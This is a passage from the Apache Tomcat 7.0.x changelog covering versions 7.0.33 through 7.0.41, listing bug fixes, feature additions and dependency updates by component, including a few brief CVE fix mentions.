[54703](https://bz.apache.org/bugzilla/show_bug.cgi?id=54703): Make parsing of HTTP Content-Type headers tolerant of any CR or LF characters that appear in the value passed by the application. Also fix some whitespace parsing issues identified by the additional test cases. (markt) | | --- | --- | | fix | Prevent possible WAR file locking when reading a context.xml file from an unexpanded WAR file. Note that in normal usage, the `JreMemoryLeakPreventionListener` would protect against this. (markt) | | fix | Ensure that when auto deployment runs for a Host, it uses the latest values for copyXML, deployXML and unpackWARs. (markt) | | fix | [54939](https://bz.apache.org/bugzilla/show_bug.cgi?id=54939): Provide logging (using a UserDataHelper) when HTTP header parsing fails (e.g. when maxHeaderCount is exceeded). (markt) | | add | [54944](https://bz.apache.org/bugzilla/show_bug.cgi?id=54944): Enhancements to the unit tests for FORM authentication. Patch provided by Brian Burch. (markt) | | fix | [54955](https://bz.apache.org/bugzilla/show_bug.cgi?id=54955): When a reload of the application is performed ensure that a subsequent request to the context root does not result in a 404 response. (violetagg) | | fix | [54971](https://bz.apache.org/bugzilla/show_bug.cgi?id=54971): Ensure that the correct location is used when writing files via `javax.servlet.http.Part.write(String)`. (markt) | | fix | [54974](https://bz.apache.org/bugzilla/show_bug.cgi?id=54974): Ensure that `SessionCookieConfig#set<methods>` will throw `IllegalStateException` if the `ServletContext` from which this `SessionCookieConfig` was acquired has already been initialized. (violetagg) | | fix | [54981](https://bz.apache.org/bugzilla/show_bug.cgi?id=54981): Ensure that `ServletContext#getJspConfigDescriptor()` will return `null` when there is no jsp configuration provided by web.xml/web-fragment.xml. (violetagg) | | fix | Ensure that when Tomcat's anti-resource locking features are used that the temporary copy of the web application and not the original is removed when the web application stops. (markt) | | fix | [54984](https://bz.apache.org/bugzilla/show_bug.cgi?id=54984): Use the correct encoding when processing a form data posted as multipart/form-data even when the request parameters are not parsed. (violetagg) | | fix | [54999](https://bz.apache.org/bugzilla/show_bug.cgi?id=54999): The old JSESSIONIDSSO needs to be removed when SSO is being used and logout() and login() occur within a single request. Patch provided by Keith Mashinter. (markt) | | add | [55035](https://bz.apache.org/bugzilla/show_bug.cgi?id=55035): Add support for the version attribute to the deploy command of the Ant tasks for interfacing with the text based Manager application. Patch provided by Sergey Tcherednichenko. (markt) | | add | [55046](https://bz.apache.org/bugzilla/show_bug.cgi?id=55046): Add a Servlet Filter that implements [CORS](http://www.w3.org/TR/cors/). Patch provided by Mohit Soni. (markt) | | add | [55052](https://bz.apache.org/bugzilla/show_bug.cgi?id=55052): JULI's LogManager now additionally looks for logging properties without prefixes if the property cannot be found with a prefix. (markt) | | fix | Ensure that only the first asynchronous dispatch operation for a given asynchronous cycle will be performed. Any subsequent asynchronous dispatch operation for the same asynchronous cycle will be ignored and `IllegalStateException` will be thrown. (violetagg) | |  | **Coyote** | | --- | | | fix | [54947](https://bz.apache.org/bugzilla/show_bug.cgi?id=54947): Fix the HTTP NIO connector that incorrectly rejected a request if the CRLF terminating the request line was split across multiple packets. Patch by Konstantin Preißer. (markt) | | --- | --- | |  | **Jasper** | | --- | | | fix | [54964](https://bz.apache.org/bugzilla/show_bug.cgi?id=54964): Allow tag plug-ins to be packaged with a web application. Patch provided by Sheldon Shao. (markt) | | --- | --- | | fix | [54968](https://bz.apache.org/bugzilla/show_bug.cgi?id=54968): Return the correct version number (2.2) of the JSP specification that is supported by the JSP engine when `javax.servlet.jsp.JspEngineInfo#getSpecificationVersion()` is invoked. (violetagg) | |  | **Cluster** | | --- | | | add | Add `maxValidTime` attribute to prevent the leak of `FileMessageFactory` in `FarmWarDeployer`. (kfujino) | | --- | --- | | code | Simplify the code of `ReplicationValve`: Rather than get cluster instance from container on every request, use instance variable. (kfujino) | | add | Add `maxWait` attribute that the senderPool will wait when there are no available senders. (kfujino) | | add | Improve error message by including specified timeout if failed to retrieve a data sender. (kfujino) | | add | Add `removeSuspectsTimeout` attribute in order to remove a suspect node in TcpFailureDetector. (kfujino) | |  | **Web applications** | | --- | | | fix | [54931](https://bz.apache.org/bugzilla/show_bug.cgi?id=54931): Add information to the Window Service how-to about installing and running multiple instances. Based on a patch by Chris Derham. (markt) | | --- | --- | | fix | [54932](https://bz.apache.org/bugzilla/show_bug.cgi?id=54932): Correct the link to Tribes documentation. (violetagg) | | add | Add document for `o.a.c.tribes.group.interceptors.TcpFailureDetector`. (kfujino) | | | |  | **Tomcat 7.0.40 (markt)** | **released 2013-05-09** | | --- | --- | | | **Catalina** | | --- | | | update | Update Tomcat's internal copy of Commons FileUpload to FileUpload 1.3. (markt) | | --- | --- | | fix | [54178](https://bz.apache.org/bugzilla/show_bug.cgi?id=54178), CVE-2013-2071: Protect against `AsyncListener` implementations that throw `RuntimeException`s in response to an event. (markt) | | fix | [54791](https://bz.apache.org/bugzilla/show_bug.cgi?id=54791): Restore `tools.jar` entry in `jarsToSkip` property to prevent warnings when running Tomcat from Eclipse. (markt) | | fix | [54851](https://bz.apache.org/bugzilla/show_bug.cgi?id=54851): When scanning for web fragments, directories without any web-fragment.xml should not impact the status of distributable element. Patch provided by Trask Stalnaker. (violetagg) | | fix | When an error occurs during the sending of a WebSocket message, notify the Inbound side (where all the events occur that the application reacts to) that an error has occurred and that the connection is being closed. (markt) | | fix | [54906](https://bz.apache.org/bugzilla/show_bug.cgi?id=54906): Better error message if a `ConcurrentModificationException` occurs while checking for memory leaks when a web application stops. Also ensure that the exception does not cause remaining checks to be skipped. Based on a patch by NateC. | | fix | Allow 204 responses (no content) to include entity headers as required by RFC2616. (markt) | |  | **Coyote** | | --- | | | fix | Ensure write errors when using HTTP Upgrade with the APR/native connector result in `IOException`s rather than errors being silently swallowed. (markt) | | --- | --- | |  | **Jasper** | | --- | | | fix | [54802](https://bz.apache.org/bugzilla/show_bug.cgi?id=54802): Provide location information for exceptions thrown by JspDocumentParser. (kkolinko) | | --- | --- | | fix | [54801](https://bz.apache.org/bugzilla/show_bug.cgi?id=54801): Do not attempt to parse text that looks like an EL expressions inside a scriptlet in a JSP document because EL expressions are not permitted in scriptlets. (kkolinko/markt) | | fix | [54821](https://bz.apache.org/bugzilla/show_bug.cgi?id=54821): Do not attempt to parse text that looks like an EL expressions in a JSP document if EL expressions have been disabled. (kkolinko/markt) | | fix | [54888](https://bz.apache.org/bugzilla/show_bug.cgi?id=54888): Add support for CSV lists with the ForEach tag plugin. Patch provided by Sheldon Shao. (markt) | |  | **Cluster** | | --- | | | fix | Add several improvements for FarmWarDeployer. (kfujino) | | --- | --- | |  | **Web applications** | | --- | | | fix | [54872](https://bz.apache.org/bugzilla/show_bug.cgi?id=54872): Correct Cluster Receiver page of Tomcat documentation. (violetagg) | | --- | --- | |  | **jdbc-pool** | | --- | | | update | Document `StatementCache` interceptor. (kkolinko) | | --- | --- | | fix | Fix minor threading issue in `ConnectionPool`. (markt/kkolinko) | | fix | [54732](https://bz.apache.org/bugzilla/show_bug.cgi?id=54732): Fix leak of statements in `StatementCache` interceptor. (kkolinko) | | fix | Fix NPE in `SlowQueryReportJmx` when running `TestSlowQueryReport` test. (kkolinko) | |  | **Other** | | --- | | | update | Update to Eclipse JDT Compiler 4.2.2. (kkolinko) | | --- | --- | | update | [54890](https://bz.apache.org/bugzilla/show_bug.cgi?id=54890): Update to Apache Commons Daemon 1.0.15. (mturk) | | update | Convert remaining unit tests to JUnit 4 and enable Checkstyle rule that forbids use of methods from JUnit 3. (markt/kkolinko) | | fix | Remove unneeded permissions for reading UserDataHelper properties from `catalina.policy` file. The class that needed those was moved in 7.0.26. (kkolinko) | | | |  | **Tomcat 7.0.39 (markt)** | **released 2013-03-26** | | --- | --- | | | **Catalina** | | --- | | | fix | Ensure a log message is generated when a web application fails to start due to an error processing a ServletContainerInitializer. (markt) | | --- | --- | | fix | Prevent NPE in JAR scanning when running in an environment where the bootstrap class loader is not an ancestor of the web application class loader such as OSGi environments. (violetagg) | | fix | Ensure that, if a call to UEncoder#encodeURL is made, all internal structures are properly cleaned. (violetagg) | | add | [54660](https://bz.apache.org/bugzilla/show_bug.cgi?id=54660): Enable the modification of an access log's `fileDateFormat` attribute while the access log is in use. The change will take effect when the next entry is made to the access log. (markt) | | update | Update Tomcat's internal copy of Commons FileUpload to FileUpload trunk, revision 1458500 and the associated extract from Commons IO to 2.4. (markt) | | fix | [54702](https://bz.apache.org/bugzilla/show_bug.cgi?id=54702): Prevent file descriptors leak and ensure that files are closed when parsing web application deployment descriptors. (violetagg) | | fix | [54707](https://bz.apache.org/bugzilla/show_bug.cgi?id=54707): Further relax the parsing of DIGEST authentication headers to allow for buggy clients that quote values that RFC2617 states should not be quoted. (markt/kkolinko) | | fix | Enable support for MBeans with multiple operations with the same name but different signatures. (markt) | | code | Deprecate Tomcat's internal Base 64 encoder/decoder and switch to using a package renamed copy of the Commons Codec implementation. (markt) | | fix | Ensure that StandardJarScanner#scan will use the provided class loader when scanning the class loader hierarchy. (violetagg) | |  | **Coyote** | | --- | | | fix | [54690](https://bz.apache.org/bugzilla/show_bug.cgi?id=54690): Fix a regression caused by the previous fix for [54406](https://bz.apache.org/bugzilla/show_bug.cgi?id=54406). If no values are specified for sslEnabledProtocols or ciphers use the default values for server sockets rather than the default values for client sockets. (markt) | | --- | --- | |  | **Web applications** | | --- | | | update | Correct Deployer, Manager and Context pages of Tomcat documentation. (kkolinko) | | --- | --- | |  | **jdbc-pool** | | --- | | | fix | [52318](https://bz.apache.org/bugzilla/show_bug.cgi?id=52318): Version for imported package `org.apache.juli.logging` is extended to include also 7.0.x versions. The fix is applicable only when running in OSGi environment. Patch provided by Martin Lichtin. (violetagg) | | --- | --- | | fix | [54599](https://bz.apache.org/bugzilla/show_bug.cgi?id=54599): Do not print connection password in `PoolProperties.toString()`. Based on a patch by Daniel Mikusa. (kkolinko) | | fix | [54684](https://bz.apache.org/bugzilla/show_bug.cgi?id=54684): Add `javax.naming.spi` to `Import-Package` header in MANIFEST.MF in order to resolve `ClassNotFoundException` when running in OSGi environment. (violetagg) | |  | **Other** | | --- | | | fix | Update to Apache Commons Daemon 1.0.14 to resolve [54609](https://bz.apache.org/bugzilla/show_bug.cgi?id=54609) which meant that installation of Windows service could fail producing incorrect service launch command. (mturk) | | --- | --- | | fix | Ensure HEAD requests return the correct content length when the requested resource uses a Writer. Patch by Nick Williams. (markt) | | | |  | **Tomcat 7.0.38 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | Ensure that the request start time (used by the access log valve to calculate request processing time) is correctly recorded for the HTTP NIO connector. In some cases the request processing time may have been longer than that recorded. (markt) | | --- | --- | | update | Add one more library from JDK 7 to the value of `jarsToSkip` property in the `catalina.properties` file. (kkolinko) | | add | [53871](https://bz.apache.org/bugzilla/show_bug.cgi?id=53871): If annotation scanning results in a `StackOverflowError` due to broken class dependencies, add the class hierarchy that triggered the exception to the error message. (markt) | | add | Add a new option to the standard JarScanner implementation (`scanBootstrapClassPath`) to control if the bootstrap classpath is scanned or not. By default, it will not be scanned. (markt) | | update | Provide more consolidated servlet MBean data in the webapp MBean. (rjung) | | fix | [54584](https://bz.apache.org/bugzilla/show_bug.cgi?id=54584): Take account of the delegate attribute when building the web application class path to pass to the JSP compiler. (markt) | | fix | Copy the updated and re-packaged UTF-8 decoder from Tomcat 8.0.x and use this improved decoder for WebSocket connections. Remove the WebSocket specific UTF-8 decoder. (markt) | | fix | [54602](https://bz.apache.org/bugzilla/show_bug.cgi?id=54602): Recycle the byte to character converter used for URIs between requests to ensure an error in one request does not trigger a failure in the next request. (markt) | | fix | Use the newly added improved UTF-8 decoder for decoding UTF-8 encoded URIs and UTF-8 encoded request bodies. Invalid UTF-8 URIs will not cause an error but will make use of the replacement character when an error is detected. This will allow web applications to handle the URI which will most likely result in a 404 response. The fall-back to decoding with ISO-8859-1 if UTF-8 decoding fails has been removed. Invalid UTF-8 sequences in a request body will trigger an IOException. The way the decoder is used has also been improved. The notable change is that invalid sequences at the end of the input now trigger an error rather than being silently swallowed. (markt) | | fix | [54624](https://bz.apache.org/bugzilla/show_bug.cgi?id=54624): Ensure that the correct request body length is used when swallowing a request body after FORM authentication prior to restoring the original request preventing possible hanging when restoring POST requests submitted over AJP. (markt) | | fix | [54628](https://bz.apache.org/bugzilla/show_bug.cgi?id=54628): When writing binary WebSocket messages write from start position in array rather than the start of the array. Patch provided by blee. (markt) | |  | **Coyote** | | --- | | | code | Refactor char encoding/decoding using NIO APIs. (remm) | | --- | --- | |  | **Web applications** | | --- | | | fix | [54203](https://bz.apache.org/bugzilla/show_bug.cgi?id=54203): Complete the Javadoc for `javax.servlet.http.Part`. (markt) | | --- | --- | | fix | [54638](https://bz.apache.org/bugzilla/show_bug.cgi?id=54638): Fix display of "Used" memory value for memory pools on the status page in Manager web application when the page is rendered as XML. (kkolinko) | | fix | Correct typos in configuration samples on SSL Configuration page of Tomcat documentation. (kkolinko) | | update | Disable support for comments on Changelog page of Tomcat documentation. (kkolinko) | | fix | Fix several issues with `status.xsd` schema in Manager web application, testing it against actual output of StatusTransformer class. (kkolinko) | | fix | Clarify the documentation on how context paths may be configured for web applications. (markt) | |  | **Other** | | --- | | | update | [54601](https://bz.apache.org/bugzilla/show_bug.cgi?id=54601): Change `catalina.sh` to consistently use `LOGGING_MANAGER` variable to configure logging, instead of modifying `JAVA_OPTS` one. (kkolinko) | | --- | --- | | | |  | **Tomcat 7.0.37 (markt)** | **released 2013-02-18** | | --- | --- | | | **Catalina** | | --- | | | fix | [54521](https://bz.apache.org/bugzilla/show_bug.cgi?id=54521): Ensure that concurrent requests that require a DIGEST authentication challenge receive different nonce values. (markt) | | --- | --- | | fix | [54534](https://bz.apache.org/bugzilla/show_bug.cgi?id=54534): Ensure that, if a call to `StandardWrapper#isSingleThreadModel()` triggers the loading of a Servlet, the correct class loader is used. (markt) | | fix | [54536](https://bz.apache.org/bugzilla/show_bug.cgi?id=54536): Ensure the default error page is displayed if a custom HTTP status code is used when calling `HttpServletResponse#sendError(int, String)`. (markt) | |  | **Coyote** | | --- | | | fix | [54456](https://bz.apache.org/bugzilla/show_bug.cgi?id=54456): Ensure that if a client aborts a request when sending a chunked request body that this is communicated correctly to the client reading the request body. (markt) | | --- | --- | | update | Update the native component of the APR/native connector to 1.1.27 and make that version the recommended minimum version. (markt) | |  | **Jasper** | | --- | | | add | [54239](https://bz.apache.org/bugzilla/show_bug.cgi?id=54239): Enable web applications to provide their own Expression Language interpreter to enable them to optimise processing of expressions. Based on a patch by Sheldon Shao. (markt) | | --- | --- | |  | **Web applications** | | --- | | | add | [54505](https://bz.apache.org/bugzilla/show_bug.cgi?id=54505): Create clearer links from the JNDI How-To to the Tomcat specific options for configuring JNDI resources. (markt) | | --- | --- | |  | **Other** | | --- | | | update | Update to Apache Commons Daemon 1.0.13. (markt) | | --- | --- | | | |  | **Tomcat 7.0.36 (markt)** | **not released** | | --- | --- | | | **Catalina** | | --- | | | fix | Make additional allowances for buggy client implementations of HTTP DIGEST authentication. This is a follow-on to [54060](https://bz.apache.org/bugzilla/show_bug.cgi?id=54060). (markt) | | --- | --- | | fix | [54438](https://bz.apache.org/bugzilla/show_bug.cgi?id=54438): Fix a regression in the fix for [52953](https://bz.apache.org/bugzilla/show_bug.cgi?id=52953) that triggered a NPE when digested passwords were used and an authentication attempt was made for a user that did not exist in the realm. (markt) | | fix | [54448](https://bz.apache.org/bugzilla/show_bug.cgi?id=54448): Correctly handle `@Resource` annotations on primitives. Patch provided by Violeta Georgieva. (markt) | | fix | [54450](https://bz.apache.org/bugzilla/show_bug.cgi?id=54450): Correctly handle resource injection when part of the servlet properties uses `@Resource` and the other uses `injection-target`. Patch provided by Violeta Georgieva. (markt) | | fix | [54458](https://bz.apache.org/bugzilla/show_bug.cgi?id=54458): Include exception when logging errors in the DataSourceRealm. Patch provided by Violeta Georgieva. (markt) | | fix | [54483](https://bz.apache.org/bugzilla/show_bug.cgi?id=54483): Correct one of the Spanish translations. Based on a suggestion from adinamita. (markt) | | fix | Prevent the SSO deregister when web application is stopped or reloaded. When StandardManager(pathname="") or DeltaManager stops normally, all sessions in the context are expired. In this case, because most sessions is not time-out, SSO deregister was triggered. (kfujino) | | fix | Include the exception in the log message if the parsing of the context.xml file fails. (markt/kkolinko) | | fix | [54497](https://bz.apache.org/bugzilla/show_bug.cgi?id=54497): Make memory leak detection code more robust so a failure in the leak detection code does not prevent the Context from stopping unless the error is fatal to the JVM. (markt) | | fix | [54507](https://bz.apache.org/bugzilla/show_bug.cgi?id=54507): Do not start the background thread that is used for expiring sessions (amongst other things) until the web application is fully started. Stop the background thread as soon as the web application is stopped. (markt) | | fix | Allow WebSocket Ping/Pong messages to be sent between fragments of a fragmented message. (markt) | | fix | [54612](https://bz.apache.org/bugzilla/show_bug.cgi?id=54612): Check if the socket is closed before trying to write a WebSocket message to it. Also, flush any partial buffered data before closing the socket. (markt) | |  | **Coyote** | | --- | | | fix | [54324](https://bz.apache.org/bugzilla/show_bug.cgi?id=54324): Allow APR connector to disable TLS compression if OpenSSL supports it. (schultz) | | --- | --- | | fix | [54406](https://bz.apache.org/bugzilla/show_bug.cgi?id=54406): Fix NIO HTTPS connector to prune specified `ciphers` and `sslEnableProtocols` options to those supported by the SSL implementation, sharing logic with the BIO connector. Modified ciphers and sslEnabledProtocols option pruning to not silently revert to JVM defaults when none of the options specified are supported - new behaviour is to warn and explicitly enable no options. (timw) | | fix | Align NIO HTTP connector with other HTTP connectors and include leading blank lines when determining the size of the HTTP headers. (markt) | |  | **Jasper** | | --- | | | fix | [53869](https://bz.apache.org/bugzilla/show_bug.cgi?id=53869): Performance improvement for pages with lots of heavily nested tags. Retain a reference to the root JSP context rather than traversing the hierarchy on every call. Based on a patch suggested by Sheldon Shao. (markt) | | --- | --- | | fix | [54440](https://bz.apache.org/bugzilla/show_bug.cgi?id=54440): Correct a regression caused by the changes for [54240](https://bz.apache.org/bugzilla/show_bug.cgi?id=54240) that broke compilation of JSPs with JspC. Patch provided by Sheldon Shao. (markt) | | fix | [54466](https://bz.apache.org/bugzilla/show_bug.cgi?id=54466): Improve error message by including the name of the file when the java file generated from a tag file cannot be compiled. Based on a patch by Sheldon Shao. (markt) | |  | **Cluster** | | --- | | | fix | Fix incorrect increment of `counterSend_EVT_SESSION_EXPIRED` and `counterSend_EVT_CHANGE_SESSION_ID`. These values are not incremented if no members active in cluster group. (kfujino) | | --- | --- | | fix | [54476](https://bz.apache.org/bugzilla/show_bug.cgi?id=54476): Correct error in Javadoc of GroupChannel send methods to maker clear that the minimum length of the destination member array is one, not two. (markt) | | fix | Prevent SSO deregister when node shutdown normally in cluster environment. (kfujino) | | fix | Check cluster member before sending replicate message in ClusterSingleSignOn. (kfujino) | |  | **Web applications** | | --- | | | fix | [54461](https://bz.apache.org/bugzilla/show_bug.cgi?id=54461): Improve the documentation for the compiler attribute in the Jasper how-to. (markt) | | --- | --- | | add | Add Jespa to the list of third-party Windows authentication providers and make external links in the documentation for those providers `no-follow`. (markt) | |  | **Tribes** | | --- | | | fix | [54496](https://bz.apache.org/bugzilla/show_bug.cgi?id=54496): Don't use a hard-coded class name in `MemberImpl.toString()`. (markt) | | --- | --- | |  | **Other** | | --- | | | update | Update to Apache Commons Daemon 1.0.12. (markt) | | --- | --- | | | |  | **Tomcat 7.0.35 (markt)** | **released 2013-01-16** | | --- | --- | | | **Catalina** | | --- | | | fix | [54247](https://bz.apache.org/bugzilla/show_bug.cgi?id=54247): Prevent `ClassNotFoundException`s on stop when running as a service. (markt) | | --- | --- | | fix | [54249](https://bz.apache.org/bugzilla/show_bug.cgi?id=54249): Ensure resource properties are available when the context path contains encoded characters such as a space. This triggered compilation issues in Jasper. Patch provided by Polina Genova. (markt) | | fix | [54256](https://bz.apache.org/bugzilla/show_bug.cgi?id=54256): Improve error reporting when a JAR file fails extension validation by including the name of the JAR file in the exception. (markt) | | fix | Allow web applications to be stopped cleanly even if filters throw exceptions when their destroy() method is called. (markt/kkolinko) | | fix | Fix memory leak of servlet instances when running with a SecurityManager and either init() or destroy() methods fail or the servlet is a SingleThreadModel one. (kkolinko) | | code | Cleanup method cache lookup code in `SecurityUtil` class. (kkolinko) | | add | Make the Tomcat 7 non-JSR356 WebSocket implementation non-blocking (where supported by the connector) between the HTTP upgrade and the first WebSocket message from the client to the server. (markt) | | fix | [54262](https://bz.apache.org/bugzilla/show_bug.cgi?id=54262): Ensure that an empty `<absolute-ordering />` element in the main web.xml file disables scanning for web fragments. Based on a patch by Violeta Georgieva. (markt) | | fix | [54284](https://bz.apache.org/bugzilla/show_bug.cgi?id=54284): As per clarification from the Servlet EG, anonymous Filters and Servlets are not permitted. Patch by Violeta Georgieva. (markt) | | fix | [54371](https://bz.apache.org/bugzilla/show_bug.cgi?id=54371): Prevent exceptions when processing web fragments for unexpanded WAR files when the context path contains characters that need to be encoded in URLs such as spaces. Based on a patch by Polina Genova. (markt) | | add | [54372](https://bz.apache.org/bugzilla/show_bug.cgi?id=54372): Make HTTP Digest authentication header parsing tolerant of invalid headers sent by known buggy clients. (markt) | | fix | [54377](https://bz.apache.org/bugzilla/show_bug.cgi?id=54377): Correctly set request attributes for AccessLog in RemoteIpFilter. Patch by Violeta Georgieva. (markt) | | fix | [54379](https://bz.apache.org/bugzilla/show_bug.cgi?id=54379): Implement support for post-construct and pre-destroy elements in web.xml. Patch by Violeta Georgieva. (markt) | | fix | [54380](https://bz.apache.org/bugzilla/show_bug.cgi?id=54380): Do not try to register servlets or contexts into the mapper too early (which just caused a warning to be logged). (kkolinko) | | fix | Fix NPE in `WebappLoader.stopInternal` when stop is called after a failed start. (kkolinko) | | add | [54381](https://bz.apache.org/bugzilla/show_bug.cgi?id=54381): Add support for receiving WebSocket pong messages. (markt) | | fix | [54382](https://bz.apache.org/bugzilla/show_bug.cgi?id=54382): Fix NPE when SSI processing is enabled and an empty SSI directive is present. (markt) | | fix | Fix `ArrayIndexOutOfBoundsException` in `HttpParser` when parsing incorrect HTTP headers. (kkolinko) | | fix | [54387](https://bz.apache.org/bugzilla/show_bug.cgi?id=54387): Deployment must fail when multiple servlets are mapped to the same url-pattern. (markt) | | fix | [54391](https://bz.apache.org/bugzilla/show_bug.cgi?id=54391): Provide a value for the `javax.servlet.context.orderedLibs` attribute. (markt) | |  | **Coyote** | | --- | | | fix | [54248](https://bz.apache.org/bugzilla/show_bug.cgi?id=54248): Ensure that byte order marks are swallowed when using a Reader to read a request body with a BOM for those encodings that require byte order marks. (markt) | | --- | --- | | fix | Fix release of processors in `AjpNioProtocol`. Wrong object was used as a key in the connections map. (kkolinko) | |  | **Jasper** | | --- | | | add | [54240](https://bz.apache.org/bugzilla/show_bug.cgi?id=54240): Add support for auto-detection and configuration of JARs on the classpath that provide tag plug-in implementations. Based on a patch by Sheldon Shao. (markt) | | --- | --- | | fix | [54241](https://bz.apache.org/bugzilla/show_bug.cgi?id=54241): Revert the fix for [35410](https://bz.apache.org/bugzilla/show_bug.cgi?id=35410) as it was not compliant with the JSP specification, specifically that `<%= obj %>` must be translated to `out.print(obj)` which in turn becomes `out.write(String.valueOf(obj))`. This will trigger a `NullPointerException` if `obj.toString()` returns `null`. The fix for [35410](https://bz.apache.org/bugzilla/show_bug.cgi?id=35410) incorrectly suppressed the `NullPointerException` in this case. (markt) | | fix | [54242](https://bz.apache.org/bugzilla/show_bug.cgi?id=54242): Correct handle null iterations with in the JSTL ForEach tag plug-in implementation. Patch provided by Sheldon Shao. (markt) | | fix | [54260](https://bz.apache.org/bugzilla/show_bug.cgi?id=54260): Avoid `NullPointerException` when using JSP unloading and tag files. (markt) | | fix | [54370](https://bz.apache.org/bugzilla/show_bug.cgi?id=54370): Improve handling of nulls when trying to match sets of parameters to a method in EL. (markt) | | fix | [54338](https://bz.apache.org/bugzilla/show_bug.cgi?id=54338): Correctly coerce the value to the expected type when using the tag plug-in for the JSTL set tag. Patch provided by Sheldon Shao. (markt) | |  | **Web applications** | | --- | | | fix | [54244](https://bz.apache.org/bugzilla/show_bug.cgi?id=54244): Clarify the documentation for the BIO and NIO SSL configuration attributes `sslEnabledProtocols` and `sslProtocol` within the documentation web application. (markt) | | --- | --- | | add | Integrate documentation of Tomcat 7 with Apache Comments System. People can leave their comments when reading documentation online at the [tomcat.apache.org](http://tomcat.apache.org/) site. (rjung) | |  | **Other** | | --- | | | fix | [54390](https://bz.apache.org/bugzilla/show_bug.cgi?id=54390): Use 'java\_home' on Mac OS X to auto-detect JAVA\_HOME. (schultz) | | --- | --- | | | |  | **Tomcat 7.0.34 (markt)** | **released 2012-12-12** | | --- | --- | | | **Catalina** | | --- | | | fix | [53871](https://bz.apache.org/bugzilla/show_bug.cgi?id=53871): Improve error message if annotation scanning fails during web application start due to poor configuration or illegal cyclic inheritance with the application's classes. (markt) | | --- | --- | | fix | Fix unit test for AccessLogValve when using non-GMT time zone. (rjung) | | fix | [54170](https://bz.apache.org/bugzilla/show_bug.cgi?id=54170): Ensure correct registration of Filters and Servlets in the JMX registry if the Filter or Servlet name includes a character that must be quoted if used in an ObjectName value. (markt) | | add | Add new attribute `renameOnRotate` to the AccessLogValve. (rjung) | | fix | [54190](https://bz.apache.org/bugzilla/show_bug.cgi?id=54190): Correct unit tests for BASIC authentication so that session timeout is correctly tested. Also refactor unit test to make it easier to add additional tests. Patch by Brian Burch. (markt) | | fix | [54220](https://bz.apache.org/bugzilla/show_bug.cgi?id=54220): Ensure the ErrorReportValve only generates an error report if the error flag on the response has been set. (markt) | | fix | Simplify time zone handling in the access log valve and correctly handle various edge cases for non-standard DST changes. (markt) | |  | **Web applications** | | --- | | | fix | [54198](https://bz.apache.org/bugzilla/show_bug.cgi?id=54198): Clarify that `HttpServletResponse.sendError(int)` results in an HTML response by default. (markt) | | --- | --- | | fix | [54207](https://bz.apache.org/bugzilla/show_bug.cgi?id=54207): Correct JNDI factory package name in Javadoc for `org.apache.naming.java.javaURLContextFactory`. (markt) | |  | **jdbc-pool** | | --- | | | code | Fix a handful of Eclipse warnings in the JDBC pool source code including the warnings reported in [53565](https://bz.apache.org/bugzilla/show_bug.cgi?id=53565). (markt) | | --- | --- | | fix | [54150](https://bz.apache.org/bugzilla/show_bug.cgi?id=54150): Make sure that SlowQueryReportJmx mbean deregistered during webapp shutdown. Reported by Alex Franken. (kfujino) | | fix | [54194](https://bz.apache.org/bugzilla/show_bug.cgi?id=54194): Make sure that connection pool mbean is not registered when jmxEnabled is false. Patch provided by tobias.gierke. (kfujino) | |  | **Other** | | --- | | | update | Update to Eclipse JDT Compiler 4.2.1. (markt) | | --- | --- | | | |  | **Tomcat 7.0.33 (markt)** | **released 2012-11-21** | | --- | --- | | | **Catalina** | | --- | | | add | [53960](https://bz.apache.org/bugzilla/show_bug.cgi?id=53960), [54115](https://bz.apache.org/bugzilla/show_bug.cgi?id=54115): Extensions to HttpClient test helper class. Patches by Brian Burch. (markt/kkolinko) | | --- | --- | | fix | [53993](https://bz.apache.org/bugzilla/show_bug.cgi?id=53993): Avoid a possible NPE in the AccessLogValve when the session ID is logged and a session is invalidated. (markt) | | fix | Add support for LAST\_ACCESS\_AT\_START system property to PersistentManager. (kfujino) | | add | Update MIME type mapping with additional / updated mime.types from the Apache web server. (markt) | | fix | [54007](https://bz.apache.org/bugzilla/show_bug.cgi?id=54007): Fix a memory leak that prevented deletion of a context.xml file associated with a Context that had failed to deploy. Also fix the problems uncovered with undeploying such a Context once the leak had been fixed and the file could be deleted. (markt) | | fix | [54044](https://bz.apache.org/bugzilla/show_bug.cgi?id=54044): Correct bug in timestamp cache used by logging (including the access log valve) that meant entries could be made with an earlier timestamp than the true timestamp. (markt) | | fix | [54054](https://bz.apache.org/bugzilla/show_bug.cgi?id=54054): Do not share shell environment variables between multiple instances of the CGI servlet. (markt) | | fix | [54060](https://bz.apache.org/bugzilla/show_bug.cgi?id=54060): Use a simple parser rather than a regular expression to parse HTTP Digest authentication headers so the header is correctly parsed. The new approach is also faster and generates less garbage. (markt) | | fix | [54068](https://bz.apache.org/bugzilla/show_bug.cgi?id=54068): Rewrite the web fragment ordering algorithm to resolve multiple issues that resulted in incorrect ordering or failure to find a correct, valid order. (markt) | | update | The HTTP header parser added to address [52811](https://bz.apache.org/bugzilla/show_bug.cgi?id=52811) has been removed and replaced with the light-weight HTTP header parser created to address [54060](https://bz.apache.org/bugzilla/show_bug.cgi?id=54060). The new parser includes a work-around for a bug in the Adobe Acrobat Reader 9.x plug-in for Microsoft Internet Explorer that was identified when the old parser was introduced ([53814](https://bz.apache.org/bugzilla/show_bug.cgi?id=53814)). | | fix | [54076](https://bz.apache.org/bugzilla/show_bug.cgi?id=54076): Add an alternative work-around for clients that use SPNEGO authentication and expect the authenticated user to be cached per connection (Tomcat only does this if an HTTP session is available). (markt) | | fix | [54087](https://bz.apache.org/bugzilla/show_bug.cgi?id=54087): Correctly handle (ignore) invalid If-Modified-Since header rather than throwing an exception. (markt) | | fix | [54096](https://bz.apache.org/bugzilla/show_bug.cgi?id=54096): In web.xml, <env-entry> should accept any type that has a constructor that takes a single String or char. (markt) | | add | [54127](https://bz.apache.org/bugzilla/show_bug.cgi?id=54127): Add support for sending a WebSocket Ping. Patch provided by Sean Winterberger. (markt) | | fix | Fix CVE-2013-2067: In FormAuthenticator: If it is configured to change Session IDs, do the change before displaying the login form. (kkolinko) | | fix | Ensure `AsyncListener.timeout()` and `AsyncListener.complete()` are called with the correct thread context class loader. (fhanik) | | fix | [54123](https://bz.apache.org/bugzilla/show_bug.cgi?id=54123): If an asynchronous request times out without any `AsyncListener`s defined, a 500 error will be triggered. (markt) | | fix | [54124](https://bz.apache.org/bugzilla/show_bug.cgi?id=54124): Correct provided value of request attribute `javax.servlet.async.request_uri` and add missing request attribute `javax.servlet.async.path_info`. (markt) | | add | Add `denyStatus` initialization parameter to `CsrfPreventionFilter`, allowing to customize the HTTP status code used for denied 